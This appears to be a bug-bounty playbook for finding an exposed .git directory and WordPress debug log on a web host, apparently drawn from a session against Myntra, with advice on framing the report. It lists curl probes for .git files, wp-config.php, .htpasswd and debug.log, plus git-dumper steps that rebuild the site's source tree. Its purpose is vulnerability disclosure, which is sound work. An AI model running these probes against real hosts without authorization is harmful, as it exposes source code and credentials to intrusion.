# Exposed Git + WordPress debug log pattern (Myntra session)

Use this as a concrete reproduction pattern when a WordPress/CMS host may have source/build artifacts exposed.

## High-signal probes

```bash
TARGET=https://tech.example.com
curl -i $TARGET/.git/HEAD
curl -i $TARGET/.git/config
curl -i $TARGET/.git/index | head
curl -i $TARGET/.git/logs/HEAD
curl -i $TARGET/.git/refs/heads/main
curl -i $TARGET/.git/packed-refs
```

A valid exposed Git index starts with magic bytes `DIRC`:

```bash
curl -s $TARGET/.git/index | xxd | head
```

If `.git/config` is exposed, it may reveal remote origin URLs, branch names, and deployment metadata. `logs/HEAD` may reveal commit hashes, author emails, internal hostnames/users, and deployment comments.

## Controlled reconstruction

Use `git-dumper` only after confirming multiple `.git` files are exposed:

```bash
python3 -m venv /tmp/gitdump
. /tmp/gitdump/bin/activate
pip install git-dumper
git-dumper $TARGET/.git/ /tmp/target-git
cd /tmp/target-git
git ls-files | head -100
git log --oneline --decorate -10
```

A partial dump is still reportable if `HEAD`, `config`, `index`, refs, and logs are accessible and `git ls-files` reconstructs sensitive source-tree names. Do not overclaim secrets unless you actually retrieved them.

## WordPress adjacent checks

When the exposed tree is WordPress-like, immediately check:

```bash
curl -i $TARGET/.gitignore
curl -i $TARGET/wp-content/debug.log
curl -i $TARGET/readme.html
curl -i $TARGET/license.txt
curl -i $TARGET/wp-config.php
curl -i $TARGET/.htpasswd
curl -i $TARGET/.htaccess-backup-250723
```

`wp-content/debug.log` often leaks absolute paths and custom theme/plugin names, e.g. `/myntra/myntra_tech/wp-content/themes/custom_theme/file.php`. Treat it as a separate supporting info-disclosure unless it contains credentials/PII.

## Report framing

Title shape:

`Exposed .git directory on <host> allows unauthenticated source code and repository metadata disclosure`

Impact to prove:

- Public `.git/HEAD` and `.git/config` accessible
- Valid Git index (`DIRC`) accessible
- Refs/logs disclose commit hashes / author emails / internal hostnames
- Repository file tree can be reconstructed with `git-dumper` or `git ls-files`
- Any extra leaked debug logs or WordPress paths are supporting evidence

Avoid theoretical phrases. Say exactly what was retrieved and what it discloses.